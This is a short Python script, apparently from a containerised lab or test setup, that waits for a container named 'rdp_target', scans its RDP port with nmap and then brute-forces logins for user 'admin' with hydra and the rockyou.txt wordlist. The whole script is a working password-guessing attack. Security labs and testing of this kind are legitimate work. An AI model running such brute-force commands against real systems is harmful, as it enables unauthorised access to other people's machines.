import os
import time

def verify_rdp_target():
    print("[*] Checking RDP target status...")
    
    # Wait for container to initialize
    time.sleep(10)
    
    target_ip = "rdp_target"  # Use container name for DNS resolution
    target_port = 3389
    username = "admin"
    wordlist = "/usr/share/wordlists/rockyou.txt"
    
    print("[*] Testing RDP port...")
    os.system(f"nmap -p{target_port} -sV {target_ip}")
    
    print("[*] Attempting RDP brute-force...")
    os.system(f"hydra -l {username} -P {wordlist} rdp://{target_ip}")

if __name__ == "__main__":
    verify_rdp_target()